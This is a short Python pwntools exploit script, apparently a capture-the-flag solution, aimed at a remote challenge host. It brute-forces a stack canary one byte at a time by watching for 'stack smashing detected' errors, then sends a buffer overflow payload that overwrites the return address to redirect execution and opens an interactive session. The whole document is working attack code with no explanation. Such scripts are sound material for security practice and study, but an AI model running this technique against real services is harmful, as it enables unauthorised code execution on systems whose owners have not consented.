from pwn import *

#p = process("./pwn1")
p = remote('0.cloud.chals.io', 10677)
padding = b"A"*72

canary = b"\x00"

for i in range(7):
    for test in range(0x100):
        #print("test: ", test)
        temp = padding + canary + bytes([test])
        sleep(0.5)
        p.sendafter(b'data: ',temp)
        if b"stack smashing detected" not in p.recvuntil(b'some'):
            canary += bytes([test])
            print(canary)
            break

payload = padding + canary
payload += p64(0)
payload += p64(0x0000000000401276)
#r.sendafter(b"choose your path?\n", payload)
p.send(payload)
p.interactive()
